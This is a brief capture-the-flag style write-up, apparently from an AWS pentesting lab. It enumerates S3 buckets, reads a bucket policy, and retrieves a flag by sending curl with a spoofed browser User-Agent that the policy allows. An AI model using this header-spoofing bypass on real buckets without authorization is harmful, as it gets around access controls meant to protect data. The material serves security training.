# Special Request

Check S3 buckets and its object. 
```
aws s3api list-buckets --profile PTAcademyJllerena
aws s3api list-objects --bucket s3-special-request-522968453802 --profile PTAcademyJllerena
```
![image](https://user-images.githubusercontent.com/46797181/227651823-7ac5e81c-4b73-4268-8c14-90007399de20.png)

Check the bucket policy. `aws s3api get-bucket-policy --bucket s3-special-request-522968453802 --output text --profile PTAcademyJllerena | jq` (or python -m json.tool)
![image](https://user-images.githubusercontent.com/46797181/227652263-ce68b3dd-62ab-4905-92d0-a45e09e15559.png)

Policy shows that we need a special agent to retrieve the flag, as seen below, using `curl -s http://s3-special-request-522968453802.s3.amazonaws.com/flag | xmllint --format -` will give an access denied message but if specifying the agent `curl -s http://s3-special-request-522968453802.s3.amazonaws.com/flag -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/*'` will retrieve the flag
![image](https://user-images.githubusercontent.com/46797181/227653240-205b2561-b2f1-4f79-8f6c-1d52497eb749.png)

EXERCISE COMPLETED !!!!
